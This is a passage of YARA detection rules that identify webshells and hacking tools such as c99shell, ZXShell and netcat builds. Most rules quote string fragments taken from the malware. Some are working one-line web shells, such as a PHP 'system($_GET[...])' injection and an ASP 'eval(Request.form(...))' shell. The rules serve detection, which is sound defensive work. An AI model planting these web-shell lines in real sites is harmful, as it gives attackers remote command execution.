		hash = "c34c248fed6d5a20d8203924a2088acc"
		logic_hash = "a7dc83db26cdda757f626c42022c17bb2764074a3cc5f87b4a3aaa991fac5dc2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"

	condition:
		all of them
}
rule SIGNATURE_BASE_Debug_Dlltest_2 {
    meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "cf81e3de-513c-584d-bc37-6504e91b170c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8572-L8584"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1b9e518aaa62b15079ff6edb412b21e9"
		logic_hash = "bf260ce0f8d4728920679573cd77927b44db28ba6102923707af8d1ad7d0ef2d"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "\\Debug\\dllTest.pdb"
		$s5 = "--list the services in the computer"

	condition:
		all of them
}
rule SIGNATURE_BASE_Connector {
    meta:
		description = "Webshells Auto-generated - file connector.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e46026bc-c570-5057-a132-5a459c959a69"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8585-L8597"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3ba1827fca7be37c8296cd60be9dc884"
		logic_hash = "b8cadb7aa23a8cdef10e7b1eb05586d6c3e7c398958a80861b6f1ccd4edf1eca"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "If ( AttackID = BROADCAST_ATTACK )"
		$s4 = "Add UNIQUE ID for victims / zombies"

	condition:
		all of them
}
rule SIGNATURE_BASE_Shelltools_G0T_Root_Hiderun {
    meta:
		description = "Webshells Auto-generated - file HideRun.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dd71dbef-5b5d-5976-8b95-0f202a4b4795"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8598-L8610"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "45436d9bfd8ff94b71eeaeb280025afe"
		logic_hash = "3a6dea2314800b28e92b59595c8b79c64e66dc66ebfa8f89c2f4028b574b9a91"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Usage -- hiderun [AppName]"
		$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."

	condition:
		all of them
}
rule SIGNATURE_BASE_PHP_Shell_V1_7 {
    meta:
		description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
		author = "Florian Roth (Nextron Systems)"
		id = "7eb69ac3-90bb-5a44-8dcd-e71f5edcf18f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8611-L8622"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b5978501c7112584532b4ca6fb77cba5"
		logic_hash = "e03904177309de9ce1afa0b12bf70913b106650c3db5807f9d4ccb91fb2ade77"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"

	condition:
		all of them
}
rule SIGNATURE_BASE_Xssshell_Save {
    meta:
		description = "Webshells Auto-generated - file save.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f33c7559-e2f7-5223-a0e9-4e1d3bc7f080"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8623-L8635"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "865da1b3974e940936fe38e8e1964980"
		logic_hash = "c53034c6ebc4f01c4573e688f548e71dae944913797b12eb8f22a5ef0a368ccf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
		$s5 = "VictimID = fm_NStr(Victims(i))"

	condition:
		all of them
}
rule SIGNATURE_BASE_Screencap {
    meta:
		description = "Webshells Auto-generated - file screencap.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0c1b71d3-ad54-5230-b1ab-971647e76139"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8636-L8649"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "51139091dea7a9418a50f2712ea72aa6"
		logic_hash = "9be7ec97ef8e9b8838f7931a8fcf8d85b1543a202a7bf34fab9791fc47889cb9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "GetDIBColorTable"
		$s1 = "Screen.bmp"
		$s2 = "CreateDCA"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Phpinj_2 {
    meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Florian Roth (Nextron Systems)"
		id = "db8f835e-eb13-50f3-a60b-7d8ffcaa5eaa"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8650-L8661"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		logic_hash = "12af5182b94f01ac4fbdee92c007556aaa7f196aca116575803cedd84b81f3b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"

	condition:
		all of them
}
rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Zxrecv {
    meta:
		description = "Webshells Auto-generated - file zxrecv.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d36541f-dd55-5385-8e2b-598ad78bdf73"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8662-L8679"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5d3d12a39f41d51341ef4cb7ce69d30f"
		logic_hash = "7eef63e45f6902e4f2d5f854b2794df3101a2ef145e2d627263db429c2b728d7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RyFlushBuff"
		$s1 = "teToWideChar^FiYP"
		$s2 = "mdesc+8F D"
		$s3 = "\\von76std"
		$s4 = "5pur+virtul"
		$s5 = "- Kablto io"
		$s6 = "ac#f{lowi8a"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Ajan {
    meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "03bf98b9-c8c5-5b9f-b0cd-700c5ed58eac"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8680-L8691"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		logic_hash = "a7766caae5845ce43cff2212c25fea9a78979d10c79d8c40290b5c1471b101cd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "entrika.write \"BinaryStream.SaveToFile"

	condition:
		all of them
}
rule SIGNATURE_BASE_C99Shell {
    meta:
		description = "Webshells Auto-generated - file c99shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8692-L8703"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "90b86a9c63e2cd346fe07cea23fbfc56"
		logic_hash = "a0fcc43a80ac4d059aea36da8b4b5a81c99a54f7c66c521697805ae890d66fe8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"

	condition:
		all of them
}
rule SIGNATURE_BASE_Phpspy_2005_Full {
    meta:
		description = "Webshells Auto-generated - file phpspy_2005_full.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8704-L8715"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d1c69bb152645438440e6c903bac16b2"
		logic_hash = "8561161726a49374a9bc3389fef593e5d68dc437552e06736a235412183bef45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Zehir4_2 {
    meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7de89d22-0230-508a-ac50-f61730ad9f4e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8716-L8727"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		logic_hash = "bb10f2e28bb375366b9140c06bb242cd13fdb69e67ce72ecae0e50270566f116"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "\"Program Files\\Serv-u\\Serv"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Indexer_2 {
    meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "8ef79a60-fa8c-51ee-bd87-f5467a66099b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8728-L8739"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "135fc50f85228691b401848caef3be9e"
		logic_hash = "8cf4c8fb1e985adbed2cf20578fcfc14240f6d9fe6062bbe3fe2f895f58bc172"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop_Devpack_2005 {
    meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8740-L8753"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		logic_hash = "b312cddff4c5292cc51acc39448c815fede3c9356d7d225c3a08c7124712b3f8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
		$s8 = "scrollbar-darkshadow-color:#9C9CD3;"
		$s9 = "scrollbar-face-color:#E4E4F3;"

	condition:
		all of them
}
rule SIGNATURE_BASE__Root_040_Zip_Folder_Deploy {
    meta:
		description = "Webshells Auto-generated - file deploy.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7e592ab2-8a53-59d5-a45d-971398586479"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8754-L8767"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2c9f9c58999256c73a5ebdb10a9be269"
		logic_hash = "9852b105e6a28f5500fc6739b196dd14b9b0b69b1077be4063735380b0699abb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "halon synscan 127.0.0.1 1-65536"
		$s8 = "Obviously you replace the ip address with that of the target."

	condition:
		all of them
}
rule SIGNATURE_BASE_By063Cli {
    meta:
		description = "Webshells Auto-generated - file by063cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9b4a4842-e084-53e8-90fb-603ba034b7df"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8768-L8780"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "49ce26eb97fd13b6d92a5e5d169db859"
		logic_hash = "c89159b73232bc8fd7430b3330009f4b3eb25b9511515bc9b4cd433f7a67f30e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "#popmsghello,are you all right?"
		$s4 = "connect failed,check your network and remote ip."

	condition:
		all of them
}
rule SIGNATURE_BASE_Icyfox007V1_10_Rar_Folder_Asp {
    meta:
		description = "Webshells Auto-generated - file asp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "52150b6a-2f60-5e6b-86d1-61bc0aeb4fa8"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8781-L8792"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2c412400b146b7b98d6e7755f7159bb9"
		logic_hash = "3cc36668f0a2a6807b59c7da0b6e504b519a616ab63fb9f606eba5dc4a9e7e2f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"

	condition:
		all of them
}
rule SIGNATURE_BASE_Byshell063_Ntboot_2 {
    meta:
		description = "Webshells Auto-generated - file ntboot.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "9bcb401d-619b-54b8-be51-f0e3b6eb096c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8794-L8805"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cb9eb5a6ff327f4d6c46aacbbe9dda9d"
		logic_hash = "25df29000bb410c0ba1fec78920124f6eedbc2585541536239522d2b116270ab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"

	condition:
		all of them
}
rule SIGNATURE_BASE_U_Uay {
    meta:
		description = "Webshells Auto-generated - file uay.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6a670e19-6e53-5b13-aabf-fe74d48b9113"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8806-L8818"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "abbc7b31a24475e4c5d82fc4c2b8c7c4"
		logic_hash = "45e8938ce34fd5a253cee3867aa8c4429c6bf3fcc91098ed9df3f95656bc5f8f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
		$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Bin_Wuaus {
    meta:
		description = "Webshells Auto-generated - file wuaus.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "50b5323b-d8d1-5350-bf93-8dde3d11fd87"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8819-L8835"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "46a365992bec7377b48a2263c49e4e7d"
		logic_hash = "0509ca39662430c3ababf65ca3a6e9af95250163980829d90eddf5341168c864"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "9(90989@9V9^9f9n9v9"
		$s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
		$s3 = ";(=@=G=O=T=X=\\="
		$s4 = "TCP Send Error!!"
		$s5 = "1\"1;1X1^1e1m1w1~1"
		$s8 = "=$=)=/=<=Y=_=j=p=z="

	condition:
		all of them
}
rule SIGNATURE_BASE_Pwreveal {
    meta:
		description = "Webshells Auto-generated - file pwreveal.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3d79dd13-9012-56e2-b42a-e6b3e204c601"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8836-L8850"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b4e8447826a45b76ca45ba151a97ad50"
		logic_hash = "01c9582897c65e608d49a151fe9ade97b9a031d7d10f5fd4b4d0c2a3fd83e7b6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "*<Blank - no es"
		$s3 = "JDiamondCS "
		$s8 = "sword set> [Leith=0 bytes]"
		$s9 = "ION\\System\\Floating-"

	condition:
		all of them
}
rule SIGNATURE_BASE_Shelltools_G0T_Root_Xwhois {
    meta:
		description = "Webshells Auto-generated - file xwhois.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8f3b3bb2-5884-584a-8220-b6edbfebc8a3"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8851-L8865"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0bc98bd576c80d921a3460f8be8816b4"
		logic_hash = "75ee56dae5fde75ae4dc4bba835a96016781b747f3cff0dc6d52e665463a6070"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "rting! "
		$s2 = "aTypCog("
		$s5 = "Diamond"
		$s6 = "r)r=rQreryr"

	condition:
		all of them
}
rule SIGNATURE_BASE_Vanquish_2 {
    meta:
		description = "Webshells Auto-generated - file vanquish.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6736cad6-cba1-5b6f-ae05-e2b980280479"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8866-L8877"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2dcb9055785a2ee01567f52b5a62b071"
		logic_hash = "428dc4e6d8bcc888e6f99f69ee9f211aa029d3486b99b9716d09709dc391d9a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Vanquish - DLL injection failed:"

	condition:
		all of them
}
rule SIGNATURE_BASE_Down_Rar_Folder_Down {
    meta:
		description = "Webshells Auto-generated - file down.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "4e0a0e03-4f01-5b58-807c-0934cdda77ab"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8878-L8889"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "db47d7a12b3584a2e340567178886e71"
		logic_hash = "bc666d6333d49a2b01553e1946fc304195193b9be92e26805474e64da61455da"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"

	condition:
		all of them
}
rule SIGNATURE_BASE_Cmdshell {
    meta:
		description = "Webshells Auto-generated - file cmdShell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "be256fc4-8dc5-58e4-9ca2-5a1df936b8dd"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8890-L8901"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8a9fef43209b5d2d4b81dfbb45182036"
		logic_hash = "5e7c7537b355b162d58b8bce570b1f94a8e6b479856685a245ffaed8f9482680"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if cmdPath=\"wscriptShell\" then"

	condition:
		all of them
}
rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Nc {
    meta:
		description = "Webshells Auto-generated - file nc.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "106209fc-f957-5131-825b-8eb7835625e0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8902-L8916"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2cd1bf15ae84c5f6917ddb128827ae8b"
		logic_hash = "6106758aedb33f8983f387a58fcd815c47f793cd2a7ea3b0ebed13dd1d5b6e83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WSOCK32.dll"
		$s1 = "?bSUNKNOWNV"
		$s7 = "p@gram Jm6h)"
		$s8 = "ser32.dllCONFP@"

	condition:
		all of them
}
rule SIGNATURE_BASE_Portlessinst {
    meta:
		description = "Webshells Auto-generated - file portlessinst.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c641c522-7844-5002-8ae7-4aaf60d1337d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8917-L8930"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "74213856fc61475443a91cd84e2a6c2f"
		logic_hash = "72ca80de2ad2048d1fcbbffeebd0e4fd7d9d47d6736360674e6a85ef9943abe8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Fail To Open Registry"
		$s3 = "f<-WLEggDr\""
		$s6 = "oMemoryCreateP"

	condition:
		all of them
}
rule SIGNATURE_BASE_Setupbdoor {
    meta:
		description = "Webshells Auto-generated - file SetupBDoor.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "055ff783-fa9f-5037-a3d6-88b58ec1612f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8931-L8942"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "41f89e20398368e742eda4a3b45716b6"
		logic_hash = "b4b6a0e4b9f8975d769d340a420af37dbc344d32c72447a8c56b05e985e6d806"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\BDoor\\SetupBDoor"

	condition:
		all of them
}
rule SIGNATURE_BASE_Phpshell_3 {
    meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2f0ddfef-b3b5-592b-a9fb-fae4d825d0af"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8943-L8955"
